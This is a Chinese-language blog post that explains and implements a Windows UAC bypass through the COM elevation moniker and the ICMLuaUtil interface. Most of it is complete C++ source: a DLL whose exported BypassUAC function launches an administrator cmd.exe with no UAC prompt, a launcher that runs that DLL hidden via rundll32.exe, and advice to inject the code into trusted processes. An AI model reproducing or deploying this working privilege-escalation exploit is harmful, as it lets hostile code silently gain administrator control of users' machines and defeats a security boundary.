---
layout: post
title: 基于COM组件接口ICMLuaUtil的BypassUAC 
tags: [lua文章]
categories: [topic]
---
<p><strong>lfish</strong></p>

<h3 id="提权原理">提权原理</h3>

<p>COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用<u>提升权限的方法来激活COM类</u>，以提升COM接口权限。同时，ICMLuaUtil接口提供了ShellExec方法来执行命令，创建指定进程。</p>

<p>因此，我们可以利用COM提升名称来对ICMLuaUtil接口提权，之后通过接口调用ShellExec方法来创建指定进程，实现BypassUAC。</p>

<h3 id="实现思路">实现思路</h3>

<p>和之前常规调用COM组件接口的方式有所不同。在初始化COM环境之后，必须通过CoCreateInstanceAsAdmin函数来创建COM类才能使用权限提升COM类的程序。（具体操作看代码演示）</p>

<p>通过上述方法创建并激活ICMLuaUtil接口后，直接调用ShellExec方法来创建指定进程，实现BypassUAC。</p>

<p><strong>注意</strong>，如果执行COM提升名称代码的程序身份是不可信的，还是会触发UAC弹窗；若是可信程序，则不会触发UAC弹窗。因此，必须使这段代码在WIndows可信程序中运行。可信程序有计算器、记事本、资源管理器、rundll32.exe等。可以通过DLL注入或是劫持技术，将这段代码注入到这些可信程序的进程空间当中。</p>

<p>其中，最简单的方式是将代码编写在DLL文件当中，然后直接通过rundll32.exe来运行DLL，执行COM提升名称的代码。</p>

<h3 id="rundll32-exe介绍">rundll32.exe介绍</h3>

<p>rundll32.exe是WIndows系统中的一个程序，顾名思义，就是用来执行32位的DLL文件（DLL内部的具体函数）。系统中还有一个Rundll.exe文件，他的意思是“执行16位的DLL文件”。</p>

<p>rundll32.exe的具体作用是以命令行的方式调用动态链接程序库中的规定形式的导出函数。导出函数必须是如下形式：</p>

<pre><code class="language-c++">Void CALLBACK FunctionName (
	HWND hwnd,
	HINSTANCE hinst,
	LPTSTR lpCmdLine,
	Int nCmdShow
);
</code></pre>

<p>rundll32.exe在命令行下的使用方法为：</p>

<p><code>Rundll32.exe DLLname,Functionname [Arguments]</code></p>

<p>DLLname为需要执行的DLL文件名；</p>

<p>Functionname为需要执行的DLL文件的规定形式导出函数；</p>

<p>[Arguments]为引出函数的具体参数。</p>

<p><strong>注意</strong>：</p>

<p>C:WindowsSystem32目录中的rundll32.exe用来调用32位DLL</p>

<p>C:WindowsSysWOW64中的rundll32.exe用来调用64位DLL（SysWOW64是64位系统对32位程序的System32文件夹的重定向）</p>

<p>系统中还有一个Rundll.exe文件，他的意思是“执行16位的DLL文件”。</p>

<h3 id="代码演示">代码演示</h3>

<p>这是含有COM提升名称代码导出函数的DLL源代码（包含了头文件），对于COM编程不必深究，重要的是提权的原理。</p>

<pre><code class="language-c++">// headers and definitions
#include &#34;pch.h&#34;

#include &lt;objbase.h&gt;
#include &lt;strsafe.h&gt;

#define CLSID_CMSTPLUA                     L&#34;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&#34;
#define IID_ICMLuaUtil                     L&#34;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&#34;

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in ICMLuaUtil* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in ICMLuaUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method1)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method2)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method3)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method4)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method5)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method6)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(
		__RPC__in ICMLuaUtil* This,
		_In_     LPCWSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow
		);

	HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
		__RPC__in ICMLuaUtil* This,
		_In_      HKEY hKey,
		_In_opt_  LPCTSTR lpSubKey,
		_In_opt_  LPCTSTR lpValueName,
		_In_      LPCTSTR lpValueString
		);

	HRESULT(STDMETHODCALLTYPE* Method9)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method10)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method11)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method12)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method13)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method14)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method15)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method16)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method17)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method18)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method19)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method20)(
		__RPC__in ICMLuaUtil* This);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
};

HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid);

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable);

// import func called by rundll32.exe
void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow);


// main logic of dll
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// import func called by rundll32.exe
void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	CMLuaUtilBypassUAC((LPWSTR)L&#34;C:\Windows\System32\cmd.exe&#34;);
}

HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// init env of COM
	::CoInitialize(NULL);

	// construct string
	::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L&#34;Elevation:Administrator!new:%s&#34;, wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}

	// set BIND_OPTS3
	::RtlZeroMemory(&amp;bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	// create get name object and get COM object
	hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid);
	return hr;
}

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	do {
		::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);
		::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil);

		// improve privilege
		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));
		if (FAILED(hr))
		{
			break;
		}

		// start proc
		hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}

		bRet = TRUE;
	} while (FALSE);

	// release
	if (CMLuaUtil)
	{
		CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);
	}

	return bRet;
}
</code></pre>

<p>这是启动rundll32.exe的程序源代码：</p>

<pre><code class="language-c++">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;


int main()
{
	char szCmdLine[MAX_PATH] = { 0 };
	char szRundll32Path[MAX_PATH] = &#34;C:\Windows\System32\rundll32.exe&#34;;
	char szDllPath[MAX_PATH] = &#34;C:\Users\lfish\Projects\BypassUAC2Dll\Debug\BypassUAC2Dll.dll&#34;;
	::sprintf_s(szCmdLine, &#34;%s &#34;%s&#34; %s&#34;, szRundll32Path, szDllPath, &#34;BypassUAC&#34;);
	::WinExec(szCmdLine, SW_HIDE);

	printf(&#34;Run OK.n&#34;);
	system(&#34;pause&#34;);
	return 0;
}
</code></pre>

<p>注意代码中的dll路径是相对rundll32.exe而言的，因为是rundll32.exe来运行dll。</p>

<p>运行程序，成功得到管理员权限的cmd窗口：</p>

<p><img src="https://lfishrhungry.github.io//img/Screen Shot 2019-08-14 at 9.44.27 AM.png" alt=""/></p>

<h3 id="关于重定向">关于重定向</h3>

<p>我们编译了32位的测试程序和32位的dll，所以访问64位WIndows10系统的System32文件夹时会被重定向到SysWOW64文件夹，正好其中的rundll32.exe就是用来运行32位dll。</p>

<p>如果32位程序想要调用64位版的rundll32.exe，可以调用Wow64DisableWow64FsRedirection函数和Wow64RevertWow64FsRedirection函数来关闭和恢复文件重定向。（一定要及时恢复文件重定向，否则系统会出一些问题）</p>

<p>同时32位程序在访问64位系统的注册表时，也会出现注册表重定向情况，可以在调用RegCreateKeyEx函数打卡注册表时设置KEY_WOW64_64KEY的注册表访问权限，确保访问到64位下的注册表，不被注册表重定向。</p>